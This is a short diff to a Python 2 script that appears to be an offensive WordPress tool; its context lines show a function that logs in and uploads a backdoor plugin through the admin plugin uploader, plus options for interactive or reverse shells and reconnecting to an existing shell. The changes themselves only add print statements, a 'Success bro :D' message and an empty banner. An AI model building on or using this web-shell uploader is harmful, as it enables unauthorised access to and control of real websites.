@@ -54,6 +54,7 @@ def uploadbackdoor(host,username,password,type,verbose, agent):
              }
     r4 = session.post(host + "/wp-admin/update.php?action=upload-plugin",headers=headers, files=files)
     if r.status_code == 200:
+        print ""
         if "Plugin installed successfully" in r4.text:
             if verbose is True:
                 print "Plugin installed successfully"
@@ -61,6 +62,7 @@ def uploadbackdoor(host,username,password,type,verbose, agent):
         if "Destination folder already exists" in r4.text:
             if verbose is True:
                 print "Destination folder already exists"
+    print "Success bro :D"
     return uploaddir
 
 
@@ -385,6 +387,13 @@ def safety(host,uploaddir):
     else:
         return True
 
+
+def printbanner():
+    banner = """\
+    """
+    print banner
+
+
 def argcheck(interactive,reverse,target):
 
     if interactive is False and reverse is False:
@@ -409,6 +418,7 @@ def main():
     parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
     parser.add_argument('-e','--existing',help=' Skips uploading a shell, and connects to existing shell', required=False)
     args = parser.parse_args()
+    printbanner()
     argcheck(args.interactive,args.reverse,args.target)
 
     if not args.reverse:
